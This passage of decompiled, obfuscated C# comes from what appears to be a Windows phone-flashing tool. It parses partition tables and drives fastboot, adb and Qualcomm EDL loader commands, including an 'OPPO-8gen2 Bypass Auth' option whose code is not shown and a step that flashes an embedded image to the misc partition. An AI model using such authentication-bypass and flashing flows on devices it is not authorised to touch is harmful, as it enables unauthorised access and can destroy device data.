			((object[])_5e)[i] = text.Substring(78 + 256 * (i - 1), 2) + text.Substring(76 + 256 * (i - 1), 2) + text.Substring(74 + 256 * (i - 1), 2) + text.Substring(72 + 256 * (i - 1), 2) + text.Substring(70 + 256 * (i - 1), 2) + text.Substring(68 + 256 * (i - 1), 2) + text.Substring(66 + 256 * (i - 1), 2) + text.Substring(64 + 256 * (i - 1), 2);
			((long[])this.m_5f)[i] = (long)Convert.ToUInt64((string)((object[])_5e)[i], 16);
			((long[])this.m_60)[i] = ((long[])this.m_5f)[i] * (long)this.m_58;
			((object[])_61)[i] = ((ulong[])this.m_60)[i].ToString("X");
			((object[])_62)[i] = text.Substring(94 + 256 * (i - 1), 2) + text.Substring(92 + 256 * (i - 1), 2) + text.Substring(90 + 256 * (i - 1), 2) + text.Substring(88 + 256 * (i - 1), 2) + text.Substring(86 + 256 * (i - 1), 2) + text.Substring(84 + 256 * (i - 1), 2) + text.Substring(82 + 256 * (i - 1), 2) + text.Substring(80 + 256 * (i - 1), 2);
			((long[])_63)[i] = (long)Convert.ToUInt64((string)((object[])_62)[i], 16);
			((long[])_64)[i] = ((long[])_63)[i] * (long)this.m_58;
			((object[])_65)[i] = ((ulong[])_64)[i].ToString("X");
			((long[])this.m_66)[i] = ((long[])_63)[i] - ((long[])this.m_5f)[i] + 1;
			((long[])_67)[i] = ((long[])this.m_66)[i] * (long)this.m_58;
			((object[])_68)[i] = ((ulong[])_67)[i].ToString("X");
			((long[])this.m_69)[i] = (long)((ulong)((long[])_67)[i] / 1024uL);
			bool flag = false;
			for (int j = 35; j >= 0; j += -1)
			{
				string text2 = text.Substring(256 * (i - 1) + 112 + j * 4, 2);
				if (text2 == "00" || text2 == "20")
				{
					if (flag)
					{
						text2 = "2B";
						((object[])_5c)[i] = text2 + (string)((object[])_5c)[i];
					}
				}
				else
				{
					flag = true;
					((object[])_5c)[i] = text2 + (string)((object[])_5c)[i];
				}
			}
			if (((object[])_5c)[i] == null)
			{
				((object[])_5d)[i] = "-";
			}
			else
			{
				((object[])_5d)[i] = Encoding.ASCII.GetString((byte[])_90(((object[])_5c)[i]));
			}
			((object[])this.m_6a)[i] = text.Substring(256 * (i - 1) + 6, 2) + text.Substring(256 * (i - 1) + 4, 2) + text.Substring(256 * (i - 1) + 2, 2) + text.Substring(256 * (i - 1), 2) + "-" + text.Substring(256 * (i - 1) + 10, 2) + text.Substring(256 * (i - 1) + 8, 2) + "-" + text.Substring(256 * (i - 1) + 14, 2) + text.Substring(256 * (i - 1) + 12, 2) + "-" + text.Substring(256 * (i - 1) + 16, 4) + "-" + text.Substring(256 * (i - 1) + 20, 12);
			((object[])this.m_6b)[i] = text.Substring(256 * (i - 1) + 32 + 6, 2) + text.Substring(256 * (i - 1) + 32 + 4, 2) + text.Substring(256 * (i - 1) + 32 + 2, 2) + text.Substring(256 * (i - 1) + 32, 2) + "-" + text.Substring(256 * (i - 1) + 32 + 10, 2) + text.Substring(256 * (i - 1) + 32 + 8, 2) + "-" + text.Substring(256 * (i - 1) + 32 + 14, 2) + text.Substring(256 * (i - 1) + 32 + 12, 2) + "-" + text.Substring(256 * (i - 1) + 32 + 16, 4) + "-" + text.Substring(256 * (i - 1) + 32 + 20, 12);
		}
		return 1u;
	}

	private static object _90(object hex)
	{
		int num = ((string)hex).Length / 2;
		byte[] array = new byte[num];
		for (int i = 0; i < num; i++)
		{
			array[i] = Convert.ToByte(((string)hex).Substring(i * 2, 2), 16);
		}
		return array;
	}

	private void _91()
	{
		Array.Clear((Array)_5c, 0, ((Array)_5c).Length);
		Array.Clear((Array)_5d, 0, ((Array)_5d).Length);
		Array.Clear((Array)_5e, 0, ((Array)_5e).Length);
		Array.Clear((Array)_61, 0, ((Array)_61).Length);
		Array.Clear((Array)_62, 0, ((Array)_62).Length);
		Array.Clear((Array)_65, 0, ((Array)_65).Length);
		Array.Clear((Array)_68, 0, ((Array)_68).Length);
		Array.Clear((Array)this.m_6a, 0, ((Array)this.m_6a).Length);
		Array.Clear((Array)this.m_6b, 0, ((Array)this.m_6b).Length);
		Array.Clear((Array)this.m_5f, 0, ((Array)this.m_5f).Length);
		Array.Clear((Array)this.m_60, 0, ((Array)this.m_60).Length);
		Array.Clear((Array)_63, 0, ((Array)_63).Length);
		Array.Clear((Array)_64, 0, ((Array)_64).Length);
		Array.Clear((Array)this.m_66, 0, ((Array)this.m_66).Length);
		Array.Clear((Array)_67, 0, ((Array)_67).Length);
		Array.Clear((Array)this.m_69, 0, ((Array)this.m_69).Length);
	}

	private async Task<bool> _92(uint timeoutSeconds)
	{
		object CS_0024_003C_003E8__locals23 = new _003C_003Ec__DisplayClass268_0();
		((_003C_003Ec__DisplayClass268_0)CS_0024_003C_003E8__locals23)._003C_003E4__this = this;
		((_003C_003Ec__DisplayClass268_0)CS_0024_003C_003E8__locals23).timeoutSeconds = (int)timeoutSeconds;
		((Control)this).Invoke((Delegate)(Action)(() =>
		{
			((UICheckBox)((_003C_003Ec__DisplayClass268_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_cc).Checked = true;
		}));
		this.m_6c = new CancellationTokenSource();
		object CS_0024_003C_003E8__locals20 = new _003C_003Ec__DisplayClass268_1();
		((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass268_0)CS_0024_003C_003E8__locals23;
		((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).i = 1;
		while (((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).i <= ((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1.timeoutSeconds)
		{
			await Task.Delay(1000);
			if (((CancellationTokenSource)this.m_6c).Token.IsCancellationRequested)
			{
				((Control)this).Invoke((Delegate)(Action)(() =>
				{
					((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this._94("已停止等待端口\n");
					((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this.EnableButtons();
				}));
				return false;
			}
			if (!string.IsNullOrEmpty(((Control)this.m_126).Text))
			{
				((Control)this).Invoke((Delegate)(Action)(() =>
				{
					((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this._94("找到端口: " + ((Control)((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this.m_126).Text + "\n");
					((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this.PortQcom = ((Control)((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this.m_126).Text;
					((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this.EnableButtons();
				}));
				return true;
			}
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1._003C_003E4__this._94($"等待端口...{((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).CS_0024_003C_003E8__locals1.timeoutSeconds - ((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).i} 秒");
			}));
			((_003C_003Ec__DisplayClass268_1)CS_0024_003C_003E8__locals20).i++;
		}
		((Control)this).Invoke((Delegate)(Action)(() =>
		{
			((_003C_003Ec__DisplayClass268_0)CS_0024_003C_003E8__locals23)._003C_003E4__this._94("未找到有效端口！\n");
			((_003C_003Ec__DisplayClass268_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.msgred();
			((_003C_003Ec__DisplayClass268_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.EnableButtons();
		}));
		return false;
	}

	private void _93()
	{
		if (this.m_6c != null && !((CancellationTokenSource)this.m_6c).Token.IsCancellationRequested)
		{
			((CancellationTokenSource)this.m_6c).Cancel();
		}
	}

	private void _94(object message)
	{
		string text = ((Control)this.m_c8).Text;
		if (string.IsNullOrWhiteSpace(text))
		{
			_95(message);
			return;
		}
		int num = text.LastIndexOf("\n");
		if (num == -1)
		{
			((Control)this.m_c8).Text = (string)message;
			return;
		}
		int num2 = num + 1;
		((TextBoxBase)this.m_c8).Select(num2, text.Length - num2);
		((TextBoxBase)this.m_c8).SelectedText = (string)message;
	}

	private void _95(object message)
	{
		((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
		((TextBoxBase)this.m_c8).SelectionLength = 0;
		((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
		((TextBoxBase)this.m_c8).AppendText((string)message + Environment.NewLine);
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	public async void Shahala()
	{
		object CS_0024_003C_003E8__locals10 = new _003C_003Ec__DisplayClass275_0();
		((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this = this;
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Msg("等待端口...100 秒");
			nint num = ((await _92(100u)) ? 1 : 0);
			IntPtr intPtr = num;
			if (intPtr != (IntPtr)0)
			{
				_3d(1u);
				if (this.m_11 != null && this.m_11 != this.m_c9)
				{
					((Button)this.m_11).PerformClick();
					this.m_11 = null;
				}
			}
			return;
		}
		PortQcom = ((Control)this.m_126).Text;
		((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10).selectedItem = ((UIComboBox)this.m_10a).SelectedItem.ToString();
		await Task.Run(() =>
		{
			if (((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10).selectedItem == "官方:OPPO-8gen2（Qualcomm 8gen2 Bypass Auth）")
			{
				((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this._39();
			}
			else
			{
				((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this.m_32 = new BackgroundWorker();
				((BackgroundWorker)((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this.m_32).WorkerSupportsCancellation = true;
				((BackgroundWorker)((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this.m_32).DoWork += ((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this._22;
				((BackgroundWorker)((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this.m_32).RunWorkerAsync();
				((Component)((_003C_003Ec__DisplayClass275_0)CS_0024_003C_003E8__locals10)._003C_003E4__this.m_32).Dispose();
			}
		});
	}

	private void _97(object resource, object filePath)
	{
		using FileStream fileStream = new FileStream((string)filePath, FileMode.Create, FileAccess.Write);
		fileStream.Write((byte[])resource, 0, ((Array)resource).Length);
	}

	private async Task<bool> _98(object arguments)
	{
		object CS_0024_003C_003E8__locals10 = new _003C_003Ec__DisplayClass277_0();
		((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).tcs = new TaskCompletionSource<bool>();
		((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c fh_loader.exe " + (string)arguments,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WorkingDirectory = "C:\\TMFTool"
			},
			EnableRaisingEvents = true
		};
		((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).process.Exited += (object sender, EventArgs e) =>
		{
			((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).tcs.SetResult(((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).process.ExitCode == 0);
			((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).process.Dispose();
		};
		try
		{
			((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).process.Start();
			((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).process.BeginOutputReadLine();
			((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).process.BeginErrorReadLine();
			nint num = ((await ((_003C_003Ec__DisplayClass277_0)CS_0024_003C_003E8__locals10).tcs.Task) ? 1 : 0);
			return (byte)num != 0;
		}
		catch (Exception ex)
		{
			object obj = ex;
			_9b(this.m_c8, "执行 " + (string)arguments + " 过程中出现异常: " + ((Exception)obj).Message + "\n", Color.Red);
			return false;
		}
	}

	private void _99()
	{
		string path = "C:\\TMFTool";
		string[] array = new string[1] { "ptanalyzer.exe" };
		string[] array2 = array;
		foreach (string path2 in array2)
		{
			string text = Path.Combine(path, path2);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
					((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
					{
					}));
				}
				catch (Exception)
				{
					((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
					{
					}));
				}
			}
		}
	}

	private void _9a()
	{
		string path = "C:\\TMFTool";
		string[] array = new string[1] { "tmp.xml" };
		string[] array2 = array;
		foreach (string path2 in array2)
		{
			string text = Path.Combine(path, path2);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
					((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
					{
					}));
				}
				catch (Exception)
				{
					((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
					{
					}));
				}
			}
		}
	}

	private void _9b(object box, object text, Color color)
	{
		((TextBoxBase)box).SelectionStart = ((TextBoxBase)box).TextLength;
		((TextBoxBase)box).SelectionLength = 0;
		((RichTextBox)box).SelectionColor = color;
		((TextBoxBase)box).AppendText((string)text);
		((RichTextBox)box).SelectionColor = ((Control)box).ForeColor;
	}

	private object _9c(object line, object prefix)
	{
		int num = ((string)line).IndexOf((string)prefix);
		if (num == -1)
		{
			return null;
		}
		num += ((string)prefix).Length;
		int num2 = ((string)line).IndexOf(' ', num);
		if (num2 == -1)
		{
			num2 = ((string)line).Length;
		}
		return ((string)line).Substring(num, num2 - num).Trim();
	}

	private void _9d()
	{
		string text = "C:\\TMFTool";
		string[] files = Directory.GetFiles(text, "gpt_main*.bin");
		string[] array = files;
		foreach (string text2 in array)
		{
			try
			{
				File.Delete(text2);
			}
			catch (Exception)
			{
			}
		}
	}

	private void _9e()
	{
		string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
		string[] files = Directory.GetFiles(baseDirectory, "gpt_main*.bin");
		string[] array = files;
		foreach (string text in array)
		{
			try
			{
				File.Delete(text);
			}
			catch (Exception)
			{
			}
		}
	}

	private void _9f(object sender, EventArgs e)
	{
	}

	private async void a0(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		((Control)this.m_107).Text = "";
		falseButtons();
		this.m_11 = (Button)sender;
		this.m_12 = null;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
		}
		else
		{
			if (!((Checkbox)this.m_109).Checked)
			{
				return;
			}
			this.m_47 = OpreationMain.ReadFlash;
			_48 = READPartition.ReadPart;
			nint num2 = 0;
			object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
					if (((DataGridViewRow)obj).Cells["Check"].Value != null && (bool)((DataGridViewRow)obj).Cells["Check"].Value)
					{
						int num3 = (int)num2;
						num2 = num3 + 1;
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if (num2 == 0)
			{
				Msg("请勾选分区进行操作\n");
				EnableButtons();
			}
			else
			{
				((Control)this.m_cd).Text = "";
				await _4a();
			}
		}
	}

	private async void a1(object sender, object e)
	{
	}

	private void a2(object sender, EventArgs e)
	{
	}

	private async void a3(object sender, object e)
	{
	}

	private void a4(object sender, object e)
	{
		try
		{
			Process.Start("devmgmt.msc");
		}
		catch (Exception ex)
		{
			MessageBox.Show("无法打开设备管理器：" + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void a5(object sender, EventArgs e)
	{
	}

	private async Task<string> a6(object cmmmd)
	{
		if (!File.Exists((string)this.m_1c))
		{
			return "error: 未找到";
		}
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)this.m_1c,
				Arguments = (string)cmmmd,
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				((Process)obj).Start();
				object result = await ((Process)obj).StandardOutput.ReadToEndAsync();
				((Process)obj).WaitForExit();
				return (string)result;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			return "error: " + ex.Message;
		}
	}

	private async Task<string> a7(object cmmmd)
	{
		if (!File.Exists((string)this.m_1d))
		{
			return "error: adb.exe 未找到";
		}
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)this.m_1d,
				Arguments = (string)cmmmd,
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				((Process)obj).Start();
				object result = await ((Process)obj).StandardOutput.ReadToEndAsync();
				((Process)obj).WaitForExit();
				return (string)result;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			return "error: " + ex.Message;
		}
	}

	private object a8(object labe)
	{
		string result = ((string)labe).Replace("\r", "").Replace("\n", "");
		return Task.FromResult(result);
	}

	private async Task<bool> a9(object cmd)
	{
		if (!File.Exists((string)this.m_1d))
		{
			msgred();
			Msg("缺少必要依赖程序\n");
			return false;
		}
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)this.m_1d,
				Arguments = (string)cmd,
				UseShellExecute = false,
				CreateNoWindow = true,
				RedirectStandardOutput = true,
				RedirectStandardError = true
			};
			object obj = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				((Process)obj).Start();
				await ((Process)obj).StandardOutput.ReadToEndAsync();
				await ((Process)obj).StandardError.ReadToEndAsync();
				await ((Process)obj).WaitForExitAsync();
				if (((Process)obj).ExitCode == 0)
				{
					return true;
				}
				return false;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception)
		{
			return false;
		}
	}

	public async Task<bool> RunFastbootCommandAsync(string command, int? timeoutSeconds = null)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)_1e,
				Arguments = command,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object CS_0024_003C_003E8__locals10 = new _003C_003Ec__DisplayClass298_0();
			((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process = new Process();
			try
			{
				((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process.StartInfo = (ProcessStartInfo)startInfo;
				((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process.Start();
				object obj = ((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process.StandardOutput.ReadToEndAsync();
				object obj2 = ((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process.StandardError.ReadToEndAsync();
				if (!timeoutSeconds.HasValue)
				{
					await Task.Run(() =>
					{
						((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process.WaitForExit();
					});
				}
				else
				{
					object obj3 = Task.Delay(timeoutSeconds.Value * 1000);
					if (await Task.WhenAny(Task.Run(() =>
					{
						((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process.WaitForExit();
					}), (Task)obj3) == obj3)
					{
						try
						{
							((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process.Kill();
						}
						catch
						{
						}
						return false;
					}
				}
				object obj5 = await (Task<string>)obj + await (Task<string>)obj2;
				if (((string)obj5).Contains("FAILED") || ((string)obj5).Contains("error") || ((string)obj5).Contains("Error") || ((string)obj5).Contains("unknown"))
				{
					return false;
				}
				this.m_72 = obj5;
				return true;
			}
			finally
			{
				if (((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process != null)
				{
					((IDisposable)((_003C_003Ec__DisplayClass298_0)CS_0024_003C_003E8__locals10).process).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			object obj6 = ex;
			Msg("异常发生：" + ((Exception)obj6).Message);
			return false;
		}
	}

	private async void ab(object sender, object e)
	{
		Msg("重启设备...");
		nint num = ((await a9("reboot")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
			return;
		}
		nint num2 = ((await RunFastbootCommandAsync("reboot", 5)) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	private async void ac(object sender, object e)
	{
		Msg("重启至Bootloader...");
		nint num = ((await a9("reboot bootloader")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
			return;
		}
		nint num2 = ((await RunFastbootCommandAsync("reboot bootloader", 5)) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	private async void ad(object sender, object e)
	{
		Msg("重启至FastbootD...");
		nint num = ((await a9("reboot fastboot")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
			return;
		}
		nint num2 = ((await RunFastbootCommandAsync("reboot fastboot", 40)) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	private async void ae(object sender, object e)
	{
		object path = "C:\\TMFTool";
		Msg("重启至Recovery...");
		nint num = ((await a9("reboot recovery")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
			return;
		}
		object obj = Path.Combine((string)path, "rec.img");
		object obj2 = new FileStream((string)obj, FileMode.Create, FileAccess.Write);
		try
		{
			object rec = Resources.rec;
			((Stream)obj2).Write((byte[])rec, 0, ((Array)rec).Length);
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
		object obj3 = "C:\\TMFTool\\rec.img";
		await RunFastbootCommandAsync("flash misc " + (string)obj3, 10);
		try
		{
			File.Delete((string)obj3);
		}
		catch (Exception ex)
		{
			object obj4 = ex;
			Console.WriteLine("删除文件失败: " + ((Exception)obj4).Message);
		}
		nint num2 = ((await RunFastbootCommandAsync("reboot recovery", 5)) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	private async void af(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		Msg("重启至EDL...");
		nint num2 = ((await a9("reboot edl")) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
			return;
		}
		try
		{
			object obj = await b0("getvar unlocked", 6000u);
			if ((string)obj == "Timeout")
			{
				msgred();
				fe("Error\n");
			}
			else if (((string)obj).Contains("yes"))
			{
				fa();
				fe("OK\n");
				fe("Fastboot Reboot EDL...");
				object obj2 = await b0("oem edl", 5000u);
				if (((string)obj2).Contains("OKAY"))
				{
					fa();
					fe("OK\n");
					((Checkbox)this.m_109).Checked = false;
				}
				else if ((string)obj2 == "Timeout")
				{
					msgred();
					fe("超时\n");
				}
				else
				{
					msgred();
					fe("Error\n");
				}
			}
			else if (((string)obj).Contains("no"))
			{
				fe("设备未解锁\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				object obj3 = b1(await b0("getvar token", 5000u));
				if (!string.IsNullOrEmpty((string)obj3))
				{
					b2(this.m_c8, "需进行FDl认证！", Color.Red);
					((TextBoxBase)this.m_c8).ScrollToCaret();
					await Task.Delay(1000);
					object obj4 = new Form3();
					((Form3)obj4).SetToken((string)obj3);
					((Form)obj4).ShowDialog();
				}
			}
			else
			{
				b2(this.m_c8, "无法确定设备的解锁状态", Color.Orange);
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
		}
		catch (Exception ex)
		{
			b2(this.m_c8, "操作失败: " + ex.Message, Color.Red);
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private async Task<string> b0(object arguments, uint timeout)
	{
		object obj = string.Empty;
		object obj2 = new Process();
		try
		{
			((Process)obj2).StartInfo.FileName = "C:\\TMFTool\\fastboot.exe";
			((Process)obj2).StartInfo.Arguments = (string)arguments;
			((Process)obj2).StartInfo.RedirectStandardOutput = true;
			((Process)obj2).StartInfo.RedirectStandardError = true;
			((Process)obj2).StartInfo.UseShellExecute = false;
			((Process)obj2).StartInfo.CreateNoWindow = true;
			((Process)obj2).Start();
			object obj3 = new CancellationTokenSource();
			((CancellationTokenSource)obj3).CancelAfter((int)timeout);
			object obj4 = ((Process)obj2).StandardOutput.ReadToEndAsync();
			object obj5 = ((Process)obj2).StandardError.ReadToEndAsync();
			object obj6 = Task.WhenAll<string>((Task<string>)obj4, (Task<string>)obj5);
			if (await Task.WhenAny((Task)obj6, Task.Delay((int)timeout, ((CancellationTokenSource)obj3).Token)) == obj6)
			{
				obj = await (Task<string>)obj4;
				object obj7 = obj;
				obj = (string)obj7 + await (Task<string>)obj5;
			}
			else
			{
				((Process)obj2).Kill();
				obj = "Timeout";
			}
			((Process)obj2).WaitForExit();
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
		return (string)obj;
	}

	private object b1(object output)
	{
		string result = string.Empty;
		string pattern = "token:\\s*(\\S+)";
		Match match = Regex.Match((string)output, pattern);
		if (match.Success)
		{
			result = match.Groups[1].Value;
		}
		return result;
	}

	private void b2(object richTextBox, object text, Color color)
	{
		RichTextBox richTextBox2 = (RichTextBox)richTextBox;
		string text2 = (string)text;
		richTextBox2.Invoke((Action)(() =>
		{
			richTextBox2.SelectionStart = richTextBox2.TextLength;
			richTextBox2.SelectionLength = 0;
			richTextBox2.SelectionColor = color;
			richTextBox2.AppendText(text2 + Environment.NewLine);
			richTextBox2.SelectionColor = richTextBox2.ForeColor;
		}));
	}

	private void b3(object sender, object e)
	{
		try
		{
			Process.Start("devmgmt.msc");
		}
		catch (Exception ex)
		{
			MessageBox.Show("无法打开设备管理器：" + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private async void b4(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			DialogResult dialogResult = MessageBox.Show("是否重启设备？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
			if (dialogResult != DialogResult.Yes)
			{
				return;
			}
			object value = ((Control)this.m_126).Text.Trim();
			if (string.IsNullOrEmpty((string)value))
			{
				MessageBox.Show("请填写端口号", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (((Control)this.m_126).Text.Contains("COM"))
			{
				PortQcom = ((Control)this.m_126).Text;
			}
			OpenDisk(PortQcom);
			Log2("重启设备...", Color.Black, isBold: false, newline: true);
			_56();
			((Checkbox)this.m_109).Checked = false;
			Log2("OK", Color.DodgerBlue, isBold: false);
			Log2("", Color.DodgerBlue, isBold: false, newline: true);
			((Control)this.m_cf).Text = "重启设备完成";
			DiskClose();
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private void b5(object sender, EventArgs e)
	{
	}

	private async void b6(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			DialogResult dialogResult = MessageBox.Show("是否重启设备到EDl模式？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
			if (dialogResult != DialogResult.Yes)
			{
				return;
			}
			object obj = new _003C_003Ec__DisplayClass310_0();
